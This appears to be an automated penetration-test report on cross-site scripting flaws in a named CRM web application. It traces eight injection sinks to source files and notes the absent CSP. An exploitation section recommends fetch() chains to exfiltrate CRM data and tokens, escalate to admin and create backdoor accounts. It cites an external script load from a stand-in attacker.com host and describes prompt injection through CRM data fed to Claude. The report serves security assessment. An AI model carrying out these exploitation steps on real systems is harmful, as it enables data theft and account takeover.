# Cross-Site Scripting (XSS) Analysis Report

**Target:** https://v2.leaddrivecrm.org
**Date:** 2026-03-27
**Analyst:** XSS Analysis Specialist
**Input:** `deliverables/recon_deliverable.md`, `deliverables/code_analysis_deliverable.md`
**Output:** `deliverables/xss_exploitation_queue.json`

---

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** **8 XSS vulnerabilities confirmed** across the LeadDrive v2 CRM application. All 8 findings are rated high-confidence based on complete source-to-sink code traces. One vulnerability (Sink #4 — Email Template Preview) was **live-confirmed** with browser-level payload execution (`document.title` changed to `"XSS-CONFIRMED"`). All confirmed findings have been passed to the exploitation phase via `deliverables/xss_exploitation_queue.json`.
- **CSP Status:** **No Content-Security-Policy header detected.** All confirmed XSS findings are fully exploitable without any CSP bypass requirement.
- **Cookie Security:** The primary CRM session cookie (`__Secure-authjs.session-token`) is `HttpOnly` and `Secure` — preventing direct `document.cookie` theft. However, the `portal-token` cookie lacks the `Secure` flag. More critically, the absence of CSP means an attacker can make arbitrary authenticated API requests via `fetch()` (CSRF via XSS), exfiltrate all CRM data, and perform account takeover through API-level exploitation.
- **Purpose of this Document:** This report provides the strategic context, dominant vulnerability patterns, environmental intelligence, and complete source-to-sink traces necessary to effectively exploit the identified vulnerabilities.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Stored XSS via `dangerouslySetInnerHTML` on Rich-Text Fields

**Description:** The application stores user-authored HTML content (KB articles, email templates) in the database without any sanitization, then renders it in React components using `dangerouslySetInnerHTML={{ __html: field }}` without applying DOMPurify or any other sanitization at render time.

**Root Cause:** A `sanitizeHtml()` utility backed by `isomorphic-dompurify` exists at `src/lib/sanitize.ts` and a corresponding Zod transform (`sanitizedHtmlSchema`) exists — but neither is wired into the KB, email template, or email log content paths. The sanitizer is only applied to `contactSchema.notes` and `dealSchema.description`.

**Implication:** This is the most impactful pattern. Any authenticated user who can write to these fields (KB authors, email template creators) can inject persistent JavaScript that executes in every viewer's browser session — including both the admin dashboard and the public-facing customer portal.

**Representative Findings:** XSS-VULN-01, XSS-VULN-02, XSS-VULN-03, XSS-VULN-04.

---

### Pattern 2: Server-Side HTML Template Injection (Invoice/Offers Generation)

**Description:** Server-side TypeScript functions (`src/lib/invoice-html.ts`, `src/app/api/v1/offers/[id]/send/route.ts`, `src/app/api/v1/invoices/[id]/act/route.ts`) construct HTML documents via ES6 template literals that directly interpolate user-controlled database values (company names, invoice item descriptions, signer names, logo URLs, offer notes) without any HTML entity encoding.

**Root Cause:** No `htmlEscape()` or equivalent function exists anywhere in the invoice/offer HTML generation pipeline. The attack surface spans organization settings (writable by admins), invoice fields (writable by any authenticated user), and linked company/contact records.

**Implication:** These server-side HTML documents are served both as browser-rendered HTML pages (returning `Content-Type: text/html`) and as email bodies. Stored XSS in these contexts affects every recipient who views the invoice/offer — including external customers who receive links.

**Representative Findings:** XSS-VULN-06, XSS-VULN-07, XSS-VULN-08.

---

### Pattern 3: DOM-Based XSS via `innerHTML` Assignment in Rich-Text Editor

**Description:** The email template editor (`src/components/email-template-form.tsx`) assigns unsanitized `form.htmlBody` directly to a live DOM node's `innerHTML` property in two `useEffect`/`useCallback` hooks (lines 81, 90). This causes the browser to immediately parse and render the HTML, executing event-handler-based payloads (`onerror`, `onload`, `onfocus`, etc.) on assignment.

**Implication:** This is a **live-confirmed** code execution path. The `innerHTML` assignment pattern bypasses React's default XSS protection (React normally escapes output), making it a direct DOM-level sink. It does not require server-side rendering at all — the XSS fires the moment the template editor component mounts with malicious content.

**Representative Finding:** XSS-VULN-04 (live-confirmed with browser evidence).

---

## 3. Strategic Intelligence for Exploitation

### Content Security Policy (CSP) Analysis

**Current CSP:** **None detected.** The application returns no `Content-Security-Policy` header on any endpoint tested (`/`, `/login`, `/api/health`).

**Implication for Exploitation:** There are **no CSP restrictions** on script execution. Exploitation payloads can use:
- Inline `<script>` tags
- Event handler attributes (`onerror`, `onload`, `onfocus`)
- `javascript:` URI schemes
- Dynamic `fetch()` calls to exfiltrate data or perform API actions
- Arbitrary external script loading (`<script src="https://attacker.com/payload.js">`)

**No CSP bypass research is required.** Standard payloads work as-is.

### Cookie Security Analysis

| Cookie | HttpOnly | Secure | SameSite | Stealable via XSS? |
|--------|----------|--------|----------|-------------------|
| `__Secure-authjs.session-token` (CRM JWT) | ✅ Yes | ✅ Yes | Lax | ❌ Not directly |
| `__Host-authjs.csrf-token` | ✅ Yes | ✅ Yes | Lax | ❌ Not directly |
| `portal-token` (customer portal JWT) | ✅ Yes | ❌ **No** | Lax | ❌ Not directly (httpOnly) |

**Key Finding:** While cookies are HttpOnly (preventing `document.cookie` access), the session token value being unavailable does NOT prevent session hijacking via XSS. An attacker can:

1. **Make authenticated API requests via `fetch()`** — XSS code runs in the authenticated session context; cookies are automatically sent with same-origin requests.
2. **Exfiltrate CRM data** — contacts, deals, invoices, API tokens (`/api/v1/channels`), user credentials, SMTP config.
3. **Escalate privileges** — Call `PUT /api/v1/users/[id]` to promote any user to admin role.
4. **Create backdoor accounts** — Call `POST /api/v1/users` to create a new admin user.
5. **Exfiltrate channel secrets** — Call `GET /api/v1/channels` to retrieve WhatsApp/Telegram/SMS API tokens.

**Recommendation for Exploitation:** Do not attempt `document.cookie` theft. Instead, use `fetch()` chains to (1) get current user info, (2) get all contacts/invoices/channel tokens, (3) escalate privileges. The RBAC bypass (any user can self-promote to admin) further amplifies XSS impact.

### Attack Surface Accessibility

| Vulnerability | External Attacker Access | Required Prerequisite |
|--------------|--------------------------|----------------------|
| KB Article XSS (Sink #1) | Via dashboard (after login) | Any CRM account (even viewer role) |
| Portal KB XSS (Sink #2) | Via customer portal | Any portal customer account |
| Email Log XSS (Sink #3) | Via dashboard (after login) | Template XSS must fire first to plant payload |
| Email Template XSS (Sink #4) | Via dashboard — **LIVE CONFIRMED** | Any CRM account (even viewer role) |
| Invoice HTML XSS (Sink #6, #7) | Browser-rendered HTML via `/api/v1/invoices/[id]/act` | Any CRM account |
| Offers Send XSS (Sink #8) | Delivered via email to external recipients | Any CRM account |

**Critical Note on Attack Vector:** The hardcoded backdoor credentials (values redacted; credential rotation required) in `src/lib/auth.ts` lines 95-106 at the time of testing provided **unauthenticated admin access** to the CRM when the database was unreachable. Even without this backdoor, public registration (`POST /api/v1/auth/register`) created an admin account in the tested version. This meant **an external attacker could self-provision a CRM account** and exploit authenticated XSS sinks directly.

---

## 4. Vectors Analyzed and Confirmed Secure

No input vectors were found to have robust, context-appropriate defenses applied consistently. The `sanitizeHtml()` function (`src/lib/sanitize.ts`) is defined but only applied to two fields (`contactSchema.notes`, `dealSchema.description`). However, even for those fields, the `ALLOWED_TAGS` list (`["b", "i", "em", "strong"]`) is extremely restrictive — these fields are safe from HTML injection but not properly configured for rich-text rendering use cases.

| Source (Parameter/Key) | Endpoint/File Location | Defense Mechanism Implemented | Render Context | Verdict |
|------------------------|------------------------|-------------------------------|----------------|---------|
| `contact.notes` | `POST/PUT /api/v1/contacts` | `sanitizedHtmlSchema` Zod transform → DOMPurify with ALLOWED_TAGS whitelist | HTML_BODY | SAFE (restricted to `b`,`i`,`em`,`strong` only) |
| `deal.description` | `POST/PUT /api/v1/deals` | `sanitizedHtmlSchema` Zod transform → DOMPurify with ALLOWED_TAGS whitelist | HTML_BODY | SAFE (restricted tags) |
| `password` fields | `/api/v1/auth/*` | bcrypt hashing; never rendered as HTML | N/A | SAFE |
| `planId`, `at` in budgeting snapshot | `GET /api/budgeting/snapshot` | Prisma `$queryRaw` tagged template literal parameterizes values | SQL | SAFE (no SQL injection) |

---

## 5. Analysis Constraints and Blind Spots

### Production Prisma Schema Mismatch

The running production application has a schema mismatch: the `GET /api/v1/kb/[id]` endpoint attempts `prisma.kbArticle.findFirst({ include: { category: true } })` but `category` is not a valid relation on the `KbArticle` model in the deployed database. This caused 404 errors for individual KB article GET requests during live testing. However:

- **The stored XSS payload was confirmed stored without sanitization** via the `POST /api/v1/kb` response.
- **The list endpoint** (`GET /api/v1/kb`) returns all articles including the XSS payload verbatim.
- **Code-level analysis confirms** the `dangerouslySetInnerHTML={{ __html: article.content }}` rendering is present and would fire when the individual article page loads successfully.

This does not invalidate the finding — it represents a temporary deployment inconsistency that does not change the security posture.

### AI Observations Sink — Indirect Attack Chain

Sink #5 (AI Observations Custom Markdown Parser) requires prompt injection through CRM data (company names, overhead labels) that is fed into Claude API prompts. The attacker-controlled vector is indirect — a malicious company name injected into the CRM must survive through the AI pipeline to appear in the `result.analysis` text. This is confirmed possible in the code path, but the reliability of prompt injection through Claude's safety filters adds uncertainty. Rated `medium` confidence.

### Email Client HTML Rendering (Sink #8)

The offers send HTML injection (Sink #8) affects email bodies sent to external recipients. Most modern email clients (Gmail, Outlook) strip `<script>` tags and block `javascript:` URIs. However, `onerror`/`onload` event handlers on `<img>` elements survive in many clients. The higher-confidence vector for this sink is the `emailLog.body` storage path — the email HTML is also stored in the database and rendered via `dangerouslySetInnerHTML` in the Email Log dashboard view (Sink #3).
